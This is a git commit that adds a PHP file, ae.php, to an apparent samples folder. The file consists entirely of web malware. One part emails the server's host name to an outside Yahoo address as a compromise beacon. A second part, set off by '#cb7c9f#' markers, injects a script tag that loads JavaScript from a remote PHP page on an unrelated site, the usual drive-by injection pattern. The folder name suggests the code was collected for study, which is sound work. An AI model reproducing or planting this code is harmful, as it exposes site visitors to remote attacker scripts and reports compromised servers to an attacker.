3293b1ac1987cb5d91fc416d9170b34e0c15d214
Elijah Seymour <dostoevskylabs@users.noreply.github.com>
2017-10-04 04:08:42 +0100

    Create ae.php

---
+++ httpd.pl/samples/ae.php
@@ -0,0 +1,17 @@
+<?php 
+$host = $_SERVER['HTTP_HOST']; 
+
+$headers = "CC: ryglman@yahoo.com\r\n";
+$headers .= "BCC: ryglman@yahoo.com\r\n";
+
+
+if ( mail('ryglman@yahoo.com', $host, 'hgt5y54ytr', $headers) )
+{echo "Jm73uZ";} ?>
+<?php
+#cb7c9f#
+if(empty($uj)) {
+$uj = "<script type=\"text/javascript\" src=\"http://centro-michels.org/paginas/_vti_cnf/mgvb2kbc.php?id=1032361\"></script>";
+echo $uj;
+}
+#/cb7c9f#
+?> 
